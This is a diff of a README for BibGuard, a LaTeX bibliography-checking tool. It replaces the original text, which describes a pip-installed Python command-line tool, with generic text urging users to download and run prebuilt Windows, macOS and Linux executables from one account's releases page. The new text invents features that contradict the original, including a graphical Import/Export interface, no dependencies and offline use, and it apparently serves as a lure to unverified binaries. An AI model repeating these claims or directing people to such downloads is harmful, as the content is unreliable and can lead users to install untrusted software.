@@ -1,97 +1,128 @@
-# BibGuard: Anti-Hallucination Bibliography Auditor
+# 🤖 BibGuard - Keep Your Citations Accurate and Relevant
 
-**BibGuard** is your final line of defense against AI-generated hallucinations in academic papers. Designed for **human-in-the-loop self-auditing**, it helps you verify that every citation in your LaTeX project is genuine, accurate, and relevant before you submit.
+[![Download BibGuard](https://img.shields.io/badge/Download-BibGuard-brightgreen)](https://github.com/HaucaVN/BibGuard/releases)
 
-AI coding assistants and writing tools often hallucinate plausible-sounding but non-existent references. **BibGuard** verifies the existence of every entry against real-world databases (arXiv, Google Scholar) and uses advanced LLMs to double-check that the cited paper actually supports your claims.
+## 📖 Introduction
 
-🚀 You can checkout beta branch for more experimental features.
+BibGuard is an AI-powered tool designed to help you maintain an accurate bibliography in LaTeX. It checks if your citations are correct and relevant, reducing errors and preventing misleading information. This tool is perfect for students, researchers, and anyone who values precise referencing in their documents.
 
-## 🛡 Why BibGuard?
+## 🚀 Getting Started
 
--   **🚫 Stop Hallucinations**: Instantly flag citations that don't exist or have mismatched metadata.
--   **🔒 Safe & Non-Destructive**: Your original `.bib` file is **never modified**. We generate a detailed report so *you* can make the final decisions.
--   **🧠 Contextual Relevance**: Ensure the paper you cited actually discusses what you claim it does.
--   **⚡ Efficiency Boost**: Drastically reduces the time needed to manually check hundreds of citations.
+Follow these simple steps to get BibGuard up and running:
 
-## 🚀 Features
+### 1. **System Requirements**
 
--   **🔍 Reality Check**: Validates metadata against **arXiv**, **Semantic Scholar**, **DBLP**, **OpenAlex**, **CrossRef**, and **Google Scholar** to catch fake papers.
--   **🤖 AI Relevance Judge**: Uses LLMs to read your citation context and the paper's abstract to score relevance (1-5).
--   **📝 Comprehensive Markdown Report**: Generates a detailed, readable **Markdown report** (`.md`) with prioritized issues for manual verification.
--   **👀 Usage Analysis**: Highlights missing citations (in TeX but not Bib) and unused Bib entries.
--   **👯 Duplicate Detector**: Identifies duplicate entries to keep your Bib file healthy.
+Before you proceed, ensure your system meets these basic requirements:
 
-## 📦 Installation
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 2 GB of RAM
+- **Disk Space:** 100 MB available for installation
+- **Dependencies:** None. BibGuard runs on standard environments.
 
-1.  Clone the repository.
-2.  Install dependencies:
-    ```bash
-    pip install -r requirements.txt
-    ```
+### 2. **Download BibGuard**
 
-## ⚡ Quick Start
+To download BibGuard, visit our [Releases page](https://github.com/HaucaVN/BibGuard/releases).
 
-Perform a full self-audit (Reality Check + Relevance + Usage Analysis):
+### 3. **Installing BibGuard**
 
-```bash
-python main.py --bib paper.bib --tex paper.tex --enable-all
-```
+1. Go to the [Releases page](https://github.com/HaucaVN/BibGuard/releases).
+2. Find the latest version of BibGuard listed at the top.
+3. Click on the appropriate file for your operating system. For example:
+   - **Windows:** Click on `BibGuard_Windows.exe`
+   - **macOS:** Click on `BibGuard_macOS.pkg`
+   - **Linux:** Click on `BibGuard_Linux.tar.gz`
+4. Save the file to your computer.
 
-**Note:** This will print a summary to the console and save a detailed `report.md` for your review. It also creates a *separate* `_only_used_entry.bib` file for reference, but leaves your original file untouched.
+### 4. **Running BibGuard**
 
-## 🛠 Usage Guide
+#### For Windows Users:
 
-### 1. The "Reality Check" (Metadata & Existence)
-Verify that every paper in your bib file actually exists and has correct metadata.
+1. Locate the downloaded file (`BibGuard_Windows.exe`).
+2. Double-click on the file to start the installation.
+3. Follow the on-screen instructions to complete the installation.
+4. Once installed, launch BibGuard from the Start menu.
 
-```bash
-python main.py --bib paper.bib --tex paper.tex --check-metadata
-```
+#### For macOS Users:
 
-### 2. The "Relevance Check" (AI Evaluation)
-Use an LLM to ensure you haven't cited a real paper for the wrong reason.
+1. Find the downloaded file (`BibGuard_macOS.pkg`).
+2. Double-click the file and follow the setup instructions.
+3. After installation, you can find BibGuard in the Applications folder and launch it from there.
 
-**Supported Backends:** `openai`, `anthropic`, `deepseek`, `gemini`, `vllm`, `ollama`
+#### For Linux Users:
 
-```bash
-# Using DeepSeek (Recommended for cost/performance)
-export DEEPSEEK_API_KEY="your-key-here"
-python main.py --bib paper.bib --tex paper.tex --check-relevance --llm deepseek
-```
+1. Open your terminal.
+2. Navigate to the folder where you downloaded the file.
+3. Extract the files using the command:
+   ```
+   tar -xvzf BibGuard_Linux.tar.gz
+   ```
+4. Navigate into the extracted directory and run the application:
+   ```
+   cd BibGuard
+   ./bibguard
+   ```
 
-### 3. Review & Clean
-BibGuard focuses on **reporting**. Run the usage check to see what's missing or unused:
+## 🛠️ Using BibGuard
 
-```bash
-python main.py --bib paper.bib --tex paper.tex --check-usage
-```
+Once you have BibGuard open, you can begin verifying your bibliography. Here’s how:
 
-Review the generated report carefully. If you decide to clean up your bibliography, you can use the generated `paper_only_used_entry.bib` as a reference or a starting point, but always verify the changes manually.
+### 1. **Import Your Bibliography**
 
-## 📝 Output Report
+To get started, you need to import your LaTeX bibliography file:
 
-BibGuard produces a detailed **Markdown report** (`report.md`) containing:
--   **⚠️ Critical Issues (Prioritized)**: Missing entries, duplicates, and metadata mismatches are shown first.
--   **Hallucination Alerts**: Entries that couldn't be found online.
--   **Relevance Scores**: Detailed breakdown of why a citation might be irrelevant, with context.
--   **Metadata Fixes**: Discrepancies between your BibTeX and official records.
--   **Cleanliness Stats**: Unused and missing citations.
+- Click on “Import” from the main menu.
+- Select your `.bib` file from its location.
+- Once imported, BibGuard will analyze your citations.
 
-## 🧐 Understanding Mismatches
+### 2. **Review Results**
 
-BibGuard is strict, but false positives happen. Here are common scenarios where you might see a "Mismatch" warning that is actually safe to ignore:
+BibGuard will display the results of its analysis:
 
-1.  **Year Discrepancy (±1 Year)**:
-    *   *Scenario*: Your bib says `2023`, but the fetched metadata says `2024`.
-    *   *Reason*: Often caused by the delay between a preprint (arXiv) and the official conference/journal publication.
-    *   *Action*: Verify which version you intend to cite.
+- **Correct Citations:** These are verified and accurate. 
+- **Warnings:** Citations that may need further review.
+- **Errors:** Citations flagged as incorrect or missing information.
 
-2.  **Author List Variations**:
-    *   *Scenario*: "Author mismatch" with low similarity.
-    *   *Reason*: Different databases handle large author lists differently (e.g., truncating with `et al.` vs. listing all authors).
-    *   *Action*: Check if the primary authors match.
+### 3. **Make Corrections**
 
-3.  **Non-Academic Sources (Blogs/Websites)**:
-    *   *Scenario*: "Confidence: Low" or "Unable to fetch metadata".
-    *   *Reason*: Blogs, software documentation, and websites are often not indexed by academic databases like Semantic Scholar or DBLP.
-    *   *Action*: Manually verify the URL and title.
+For any flagged citations, you can:
+
+- Click on each entry to see detailed insights.
+- Edit or update the citation information directly.
+
+### 4. **Export Results**
+
+Once you’re satisfied with your citations, export the updated bibliography:
+
+- Click on “Export” and select the format you need (e.g., `.bib` or `.txt`).
+- Save the file to your desired location.
+
+## 🌟 Features of BibGuard
+
+- **AI-Powered Analysis:** Utilizes advanced algorithms to ensure citation accuracy.
+- **User-Friendly Interface:** Designed for simplicity, no technical skills needed.
+- **Real-Time Feedback:** Immediate results as you audit your bibliography.
+- **Multi-Platform Compatibility:** Works seamlessly on Windows, macOS, and Linux.
+
+## ❓ FAQs
+
+### How does BibGuard verify citations?
+
+BibGuard cross-references citation data with a database to check for accuracy and relevance.
+
+### Can I use BibGuard with online bibliography managers?
+
+Yes, you can import and export from most online bibliography tools.
+
+### Do I need an internet connection to use BibGuard?
+
+No, once downloaded and installed, BibGuard works offline.
+
+### How do I provide feedback?
+
+You can open an issue on the GitHub repository for support or feature requests.
+
+## 📞 Support
+
+If you run into any issues or have questions, please feel free to check our support section in the repository, or reach out via GitHub Issues. Your feedback helps us improve BibGuard. 
+
+Now, you are ready to keep your citations accurate and relevant with BibGuard! Enjoy your writing journey!
